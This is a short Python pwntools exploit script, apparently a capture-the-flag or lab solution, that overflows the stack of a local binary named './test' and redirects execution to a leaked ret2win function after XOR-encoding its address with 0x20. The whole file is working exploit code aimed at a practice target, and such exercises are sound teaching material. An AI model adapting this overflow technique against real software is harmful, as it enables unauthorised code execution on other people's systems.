#!/usr/bin/python3
from pwn import *

context.binary=exe=ELF("./test",checksec=False)
p=process(exe.path)
ret=0x0000000000001016
ret_xored=0x2020202020203036
add_rsp=0x0000000000001012
add_rsp_xor=ret_xored=0x2020202020203032
ret2win=int(p.recvline()[:-1],16)
log.info(f"ret2win:{hex(ret2win)}")
def xored(address):
	a=str(hex(address))[2::]
	ret2win_xored="0x2020"
	for i in range(0,len(a),2):
		b=int(a[i:i+2],16)^32
		ret2win_xored+=str(hex(b)[2::]).rjust(2,"0")
	return ret2win_xored

ret2win_xored=int(xored(ret2win),16)
log.info(f"ret2win_xored{hex(ret2win_xored)}")
#input()
offest=72
payload=b"\x00"*32+b"\x20"*32
payload+=b"\x20"*8
payload+=p64(ret2win_xored)

#print(payload)
p.sendline(payload)
p.interactive()